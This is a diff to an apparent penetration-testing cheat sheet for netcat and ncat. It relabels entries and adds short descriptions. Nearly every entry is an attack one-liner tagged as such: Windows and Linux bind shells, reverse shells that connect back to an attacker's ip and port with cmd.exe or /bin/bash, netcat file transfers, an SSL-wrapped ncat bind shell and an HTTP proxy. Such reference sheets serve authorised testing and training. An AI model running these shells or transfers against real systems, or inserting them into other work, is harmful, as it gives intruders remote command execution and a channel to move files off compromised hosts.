@@ -3,42 +3,49 @@
 % nc, netcat
 
 #plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 
-## nc setup listener
+## Netcat - Setup Listener
+Sets up a Netcat listener for incoming connections.
 ```
-nc -nlvp <lport>
+nc -lvnp <lport>
 ```
 
-## nc bind shell windows
+## Netcat - Windows Bind Shell
+Creates a bind shell on a Windows target, listening for incoming connections.
 #plateform/windows 
 ```
-nc -nlvp <port> -e cmd.exe
+nc -lvnp <port> -e cmd.exe
 ```
 
-## nc bind shell linux
+## Netcat - Linux Bind Shell
+Creates a bind shell on a Linux target, listening for incoming connections.
 #plateform/linux
 ```
-nc -nlvp <port> -e /bin/bash
+nc -lvnp <port> -e /bin/bash
 ```
 
-## nc reverse shell windows
+## Netcat - Windows Reverse Shell
+Connects back to a listener on the attacking machine from a Windows target.
 #plateform/windows  #cat/ATTACK/REVERSE_SHELL 
 ```
 nc -nv <ip> <port> -e cmd.exe
 ```
 
-## nc reverse shell linux
+## Netcat - Linux Reverse Shell
+Connects back to a listener on the attacking machine from a Linux target.
 #plateform/linux #cat/ATTACK/REVERSE_SHELL 
 ```
 nc -nv <ip> <port> -e /bin/bash
 ```
 
-## nc transfer file - receiver
+## Netcat - File Transfer (Receiver)
+Sets up Netcat to receive a file.
 #plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
-nc -nlvp <port> > <incomming_file>
+nc -lvnp <port> > <incoming_file>
 ```
 
-## nc transfer file - sender
+## Netcat - File Transfer (Sender)
+Sends a file using Netcat.
 #plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nv <ip> <port> < <file_to_send>
@@ -48,19 +55,22 @@ nc -nv <ip> <port> < <file_to_send>
 
 % ncat
 
-## ncat bind shell ssl filtered
+## Ncat - Bind Shell with SSL and IP Filter
+Creates an Ncat bind shell with SSL encryption, allowing connections only from a specified IP.
 #plateform/linux #cat/ATTACK/LISTEN-SERVE 
 ```
 ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
 ```
 
-## ncat bind shell ssl connection
+## Ncat - Connect to SSL Bind Shell
+Connects to an Ncat bind shell that is using SSL.
 #plateform/linux #cat/ATTACK/LISTEN-SERVE 
 ```
 ncat -v <ip> <port> --ssl
 ```
 
-## ncat HTTP WEB proxy
+## Ncat - HTTP Web Proxy
+Sets up Ncat to act as a simple HTTP web proxy.
 #plateform/linux #cat/ATTACK/LISTEN-SERVE 
 ```
 ncat --listen --proxy-type http <port>
